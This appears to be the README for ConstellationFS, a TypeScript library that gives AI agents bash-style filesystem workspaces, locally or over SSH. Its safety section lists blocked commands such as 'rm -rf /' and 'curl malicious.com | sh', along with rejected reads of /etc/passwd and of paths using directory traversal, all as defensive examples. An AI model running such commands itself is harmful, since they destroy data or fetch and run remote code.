# ConstellationFS 🌟

A filesystem abstraction for AI agents that provides familiar bash commands instead of custom APIs.

[![npm version](https://badge.fury.io/js/constellationfs.svg)](https://badge.fury.io/js/constellationfs)
[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](https://choosealicense.com/licenses/mit/)
[![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)

## Why ConstellationFS?

AI models are already trained on millions of filesystem operations. Instead of teaching agents custom APIs, ConstellationFS lets them use the bash commands they already know: `ls`, `grep`, `cat`, `mkdir`, and more.

**The filesystem IS the API.**

## Quick Start

```bash
npm install constellationfs
```

### Basic Setup

**1. Configure the library once:**

```typescript
import { ConstellationFS } from 'constellationfs'

// Set global configuration (call once at app startup)
ConstellationFS.setConfig({
  workspaceRoot: '/constellation-fs'  // Base directory for all workspaces
})
```

**2. Create a filesystem and get a workspace:**

```typescript
import { FileSystem } from 'constellationfs'

// Local filesystem (for development)
const fs = new FileSystem({
  type: 'local',
  userId: 'user-123'
})

// OR: Remote filesystem via SSH (for production)
const fs = new FileSystem({
  type: 'remote',
  userId: 'user-123',
  host: 'your-server.com',
  sshAuth: {
    type: 'password',
    credentials: {
      username: 'user',
      password: 'pass'
    }
  }
})

// Get a workspace - all operations are isolated to this workspace
const workspace = await fs.getWorkspace('my-project')

// Execute commands
await workspace.exec('npm install')
const files = await workspace.readdir('.')
await workspace.write('config.json', JSON.stringify({ version: '1.0' }))
```

That's it! Three simple steps:
1. **Configure** - Set workspace root once
2. **Connect** - Create filesystem (local or remote)
3. **Work** - Get workspace and execute operations

## Core Concepts

### Workspace Isolation

Each workspace is isolated in its own directory: `/constellation-fs/users/{userId}/{workspaceName}/`

```typescript
const fs = new FileSystem({ type: 'local', userId: 'user-123' })

// Creates workspace at: /constellation-fs/users/user-123/project-a/
const ws1 = await fs.getWorkspace('project-a')

// Creates workspace at: /constellation-fs/users/user-123/project-b/
const ws2 = await fs.getWorkspace('project-b')

// Workspaces are completely isolated
await ws1.exec('git init')  // Only affects project-a
await ws2.exec('npm init')  // Only affects project-b
```

### Local vs Remote

**Local Backend**: Operations run on the same machine where your code runs.

```typescript
const fs = new FileSystem({ type: 'local', userId: 'user-123' })
```

**Remote Backend**: Operations run on a remote machine via SSH.

```typescript
const fs = new FileSystem({
  type: 'remote',
  userId: 'user-123',
  host: 'server.com',
  sshAuth: {
    type: 'password',
    credentials: { username: 'user', password: 'pass' }
  }
})
```

## Workspace Operations

Once you have a workspace, use familiar operations:

```typescript
const workspace = await fs.getWorkspace('my-project')

// Execute shell commands
await workspace.exec('git clone https://github.com/user/repo.git .')
await workspace.exec('npm install')
const output = await workspace.exec('npm run build')

// File operations
await workspace.write('index.ts', 'console.log("Hello")')
const content = await workspace.read('index.ts')
const files = await workspace.readdir('src')
const exists = await workspace.fileExists('package.json')

// Get workspace info
console.log(workspace.workspacePath)  // /constellation-fs/users/user-123/my-project
console.log(workspace.userId)          // user-123
console.log(workspace.workspaceName)   // my-project
```

## Connection Pooling (Optional)

For stateless web servers handling multiple requests, use `FileSystemPoolManager` to reuse SSH connections and reduce overhead:

```typescript
import { FileSystemPoolManager } from 'constellationfs'

// Create pool once at startup
const pool = new FileSystemPoolManager({
  defaultBackendConfig: {
    type: 'remote',
    host: 'server.com',
    sshAuth: { type: 'password', credentials: { username: 'user', password: 'pass' } }
  },
  idleTimeoutMs: 5 * 60 * 1000,    // Clean up idle connections after 5 minutes
  enablePeriodicCleanup: true       // Automatically cleanup idle connections
})

// In your request handlers - use callback pattern (recommended)
app.post('/api/build', async (req, res) => {
  const { userId, projectId } = req.body

  const output = await pool.withWorkspace(
    { userId, workspace: `projects/${projectId}` },
    async (workspace) => {
      return await workspace.exec('npm run build')
    }
  )
  // Connection automatically released after callback

  res.json({ output })
})

// OR: Manual lifecycle management (for complex flows)
app.post('/api/deploy', async (req, res) => {
  const { userId, projectId } = req.body

  const { workspace, release } = await pool.acquireWorkspace({
    userId,
    workspace: `projects/${projectId}`
  })

  try {
    await workspace.exec('npm run build')
    await workspace.exec('npm run deploy')
    res.json({ success: true })
  } finally {
    release()  // MUST call this!
  }
})

// Graceful shutdown
process.on('SIGTERM', async () => {
  await pool.destroyAll()
  process.exit(0)
})
```

**When to use the pool:**
- ✅ Stateless web servers with multiple requests per user
- ✅ Remote SSH backends (reduces connection overhead)
- ✅ Long-running services that need automatic cleanup

**When NOT to use the pool:**
- ❌ CLI tools (single user, single session)
- ❌ Local backends only (no connection overhead)
- ❌ Simple scripts with one-time operations

### Pool API

```typescript
// Callback pattern (automatic cleanup)
await pool.withWorkspace({ userId, workspace }, async (ws) => {
  await ws.exec('command')
})

await pool.withFileSystem({ userId }, async (fs) => {
  const ws = await fs.getWorkspace('project')
  await ws.exec('command')
})

// Manual pattern (you control lifecycle)
const { workspace, release } = await pool.acquireWorkspace({ userId, workspace })
try {
  await workspace.exec('command')
} finally {
  release()
}

const { fileSystem, release } = await pool.acquireFileSystem({ userId })
try {
  const ws = await fileSystem.getWorkspace('project')
  await ws.exec('command')
} finally {
  release()
}

// Monitoring
const stats = pool.getStats()
console.log(stats)  // { totalFileSystems: 5, activeFileSystems: 3, ... }
```

## Safety Features

### Dangerous Operation Prevention

Dangerous operations are blocked by default:

```typescript
const workspace = await fs.getWorkspace('my-project', {
  preventDangerous: true  // default
})

// These will throw DangerousOperationError:
await workspace.exec('rm -rf /')
await workspace.exec('sudo apt-get install')
await workspace.exec('curl malicious.com | sh')
```

### Path Safety

All file operations are restricted to the workspace:

```typescript
const workspace = await fs.getWorkspace('my-project')

// ✅ Works - relative paths within workspace
await workspace.read('src/index.ts')
await workspace.write('output.txt', 'data')

// ❌ Fails - absolute paths rejected
await workspace.read('/etc/passwd')

// ❌ Fails - directory traversal blocked
await workspace.read('../../secrets.txt')
```

## Advanced Features

### Environment Variables

Pass custom environment variables to workspace operations:

```typescript
const workspace = await fs.getWorkspace('my-project', {
  env: {
    NODE_ENV: 'production',
    API_KEY: 'secret',
    DATABASE_URL: 'postgres://...'
  }
})

await workspace.exec('npm run build')  // Uses custom env vars
```

### Operations Logging

Track all filesystem operations:

```typescript
import { ConsoleOperationsLogger } from 'constellationfs'

const workspace = await fs.getWorkspace('my-project', {
  operationsLogger: new ConsoleOperationsLogger()
})

// All operations are logged to console
await workspace.exec('npm install')
// [ConstellationFS] exec: npm install
```

### Multiple Workspaces per User

```typescript
const fs = new FileSystem({ type: 'local', userId: 'user-123' })

// Manage multiple projects for same user
const projectA = await fs.getWorkspace('project-a')
const projectB = await fs.getWorkspace('project-b')
const projectC = await fs.getWorkspace('project-c')

await projectA.exec('git pull')
await projectB.exec('npm test')
await projectC.exec('docker build .')
```

### Binary Data Support

```typescript
// Execute commands with binary output
const tarball = await workspace.exec('tar -czf - .', { encoding: 'buffer' })
await workspace.write('archive.tar.gz', tarball)

// Read binary files
const imageData = await workspace.read('logo.png', { encoding: 'buffer' })
```

## MCP Server Integration

ConstellationFS can run as an MCP (Model Context Protocol) server for AI applications:

```bash
# Start MCP server
npx constellationfs mcp-server \
  --workspaceRoot /constellation-fs \
  --http \
  --port 3001 \
  --authToken your-secret-token
```

```typescript
import { createConstellationMCPClient } from 'constellationfs'

const client = await createConstellationMCPClient({
  url: 'http://localhost:3001',
  authToken: 'your-secret-token',
  userId: 'user-123',
  workspace: 'my-project'
})

const result = await client.callTool({
  name: 'exec',
  arguments: { command: 'npm install' }
})

await client.close()
```

## Error Handling

```typescript
import { FileSystemError, DangerousOperationError } from 'constellationfs'

try {
  await workspace.exec('some-command')
} catch (error) {
  if (error instanceof DangerousOperationError) {
    console.log('Dangerous operation blocked:', error.command)
  } else if (error instanceof FileSystemError) {
    console.log('Operation failed:', error.message)
  }
}
```

## TypeScript Support

Full TypeScript support with comprehensive type definitions:

```typescript
import type {
  BackendConfig,
  LocalBackendConfig,
  RemoteBackendConfig,
  Workspace,
  WorkspaceConfig,
  FileSystemBackend
} from 'constellationfs'

const config: RemoteBackendConfig = {
  type: 'remote',
  userId: 'user-123',
  host: 'server.com',
  sshAuth: {
    type: 'password',
    credentials: { username: 'user', password: 'pass' }
  }
}

const fs = new FileSystem(config)
const workspace: Workspace = await fs.getWorkspace('my-project')
```

## Examples

### Express.js Web Server

```typescript
import express from 'express'
import { FileSystemPoolManager } from 'constellationfs'

const pool = new FileSystemPoolManager({
  defaultBackendConfig: {
    type: 'remote',
    host: process.env.REMOTE_HOST,
    sshAuth: {
      type: 'password',
      credentials: {
        username: process.env.SSH_USER,
        password: process.env.SSH_PASS
      }
    }
  }
})

const app = express()

app.post('/projects/:projectId/build', async (req, res) => {
  const userId = req.user.id
  const { projectId } = req.params

  try {
    const output = await pool.withWorkspace(
      { userId, workspace: `projects/${projectId}` },
      async (workspace) => {
        return await workspace.exec('npm run build')
      }
    )
    res.json({ success: true, output })
  } catch (error) {
    res.status(500).json({ error: error.message })
  }
})

process.on('SIGTERM', async () => {
  await pool.destroyAll()
  process.exit(0)
})

app.listen(3000)
```

### CLI Tool

```typescript
import { FileSystem } from 'constellationfs'

const fs = new FileSystem({ type: 'local', userId: 'cli-user' })
const workspace = await fs.getWorkspace('my-project')

// Clone repository
await workspace.exec('git clone https://github.com/user/repo.git .')

// Install dependencies
await workspace.exec('npm install')

// Run build
const output = await workspace.exec('npm run build')
console.log(output)

// Cleanup when done
await fs.destroy()
```

## Development

```bash
# Clone repository
git clone https://github.com/constellation-fs/constellation-fs.git
cd constellation-fs/constellation-typescript

# Install dependencies
npm install

# Run tests
npm test

# Build
npm run build

# Type check
npm run typecheck

# Lint
npm run lint
```

## Philosophy

The best AI tools feel invisible. By leveraging the filesystem metaphor that every developer and AI model already understands, ConstellationFS eliminates the learning curve and lets agents work with tools they already know.

Just like Docker standardized containers, ConstellationFS aims to standardize filesystem access for AI agents.

## License

MIT - see [LICENSE](LICENSE) file for details.

---

**ConstellationFS**: Where AI agents feel at home. 🏠
